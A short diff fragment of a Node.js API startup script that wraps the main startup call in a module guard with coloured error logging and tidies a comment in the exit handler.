+if (require.main === module) { 
     main_api_start().catch(err => {
         const clean_error_msg = strip_ansi_codes(String(err.message || err));
         console.error(`${COLORS['RED_BG']}${COLORS['WHITE']} 💥 A CRITICAL ERROR OCCURRED DURING API STARTUP: ${htmlEscape(clean_error_msg)} ${COLORS['RESET']}`);
@@ -2550,5 +2595,5 @@ process.on('SIGINT', () => {
 
 process.on('exit', (code) => {
     logging.info(`--- SCRIPT FINISHED WITH CODE ${code} ---`);
-    console.log(Style.RESET_ALL); // Final reset
+    console.log(Style.RESET_ALL); 
 });
